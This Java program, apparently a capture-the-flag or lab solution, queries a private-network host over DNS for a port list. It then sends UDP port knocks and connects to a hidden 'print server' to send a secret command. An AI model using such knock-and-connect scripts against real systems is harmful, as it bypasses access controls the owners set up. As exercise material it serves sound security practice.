import java.io.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Stack;

public class PrintServerExploit {
    public static void main(String[] args) throws Exception {
        InetAddress targetIP = InetAddress.getByName("10.200.51.18");
        int targetPort = 8044;
        int sourcePort = 48000; // Same as your terminal

        // Step 1: Send DNS request
        byte[] dnsRequest = buildDNSRequest();
        DatagramSocket socket = new DatagramSocket(sourcePort);
        DatagramPacket dnsPacket = new DatagramPacket(dnsRequest, dnsRequest.length, targetIP, 53);
        socket.send(dnsPacket);

        // Step 2: Receive DNS response
        byte[] buffer = new byte[1024];
        DatagramPacket responsePacket = new DatagramPacket(buffer, buffer.length);
        socket.receive(responsePacket);

        // Step 3: Extract port numbers from response
        byte[] responseData = responsePacket.getData();
        int[] ports = extractPorts(responseData, responsePacket.getLength());

        // Step 4: Send UDP knocks
        for (int port : ports) {
            byte[] knockMessage = "knock".getBytes(); // Any data is fine
            DatagramPacket knockPacket = new DatagramPacket(knockMessage, knockMessage.length, targetIP, port);
            socket.send(knockPacket);
            Thread.sleep(100); // Delay between knocks
        }
        socket.close();

        // Step 5: Connect to Print Server via TCP
        connectToPrintServer(targetIP, targetPort);
    }

    private static byte[] buildDNSRequest() throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);

        // DNS Header
        dos.writeShort(0x1a2b); // Transaction ID
        dos.writeShort(0x0100); // Flags: standard query
        dos.writeShort(1);      // Questions
        dos.writeShort(0);      // Answer RRs
        dos.writeShort(0);      // Authority RRs
        dos.writeShort(1);      // Additional RRs (OPT)

        // Question Section
        String[] domainParts = "google.com".split("\\.");
        for (String part : domainParts) {
            byte[] domainBytes = part.getBytes();
            dos.writeByte(domainBytes.length);
            dos.write(domainBytes);
        }
        dos.writeByte(0x00);       // End of domain name
        dos.writeShort(0x0010);    // Type: TXT
        dos.writeShort(0x0001);    // Class: IN

        // Additional Section: OPT record
        dos.writeByte(0x00);       // Name: root (0 length)
        dos.writeShort(0x0029);    // Type: OPT
        dos.writeShort(4096);      // UDP payload size
        dos.writeByte(0x00);       // Extended RCODE
        dos.writeByte(0x00);       // EDNS version
        dos.writeShort(0x0000);    // Z
        dos.writeShort(0x0000);    // Data length

        return baos.toByteArray();
    }

    private static int[] extractPorts(byte[] data, int length) {
        String response = new String(data, 0, length);

        Stack<String> numberStack = new Stack<>();
        StringBuilder currentNumber = new StringBuilder();

        // Read backwards to find numbers at the end
        for (int i = response.length() - 1; i >= 0; i--) {
            char c = response.charAt(i);

            if (Character.isDigit(c)) {
                currentNumber.insert(0, c); // prepend digit
            } else {
                if (currentNumber.length() > 0) {
                    numberStack.push(currentNumber.toString());
                    currentNumber.setLength(0); // reset
                }

                // Optional: stop early if we already have enough numbers
                if (numberStack.size() >= 4) {
                    break;
                }
            }
        }

        // If there is still a number collected, push it
        if (currentNumber.length() > 0) {
            numberStack.push(currentNumber.toString());
        }

        int[] ports = new int[numberStack.size()];
        int index = 0;
        while (!numberStack.isEmpty()) {
            ports[index++] = Integer.parseInt(numberStack.pop());
        }

        return ports;
    }

    private static void connectToPrintServer(InetAddress address, int port) {
        try (Socket socket = new Socket(address, port);
             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))) {

            // Read initial banner
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
                if (line.trim().isEmpty()) break;
            }

            // Send secret command
            writer.write("secret\n");
            writer.flush();

            // Read response
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}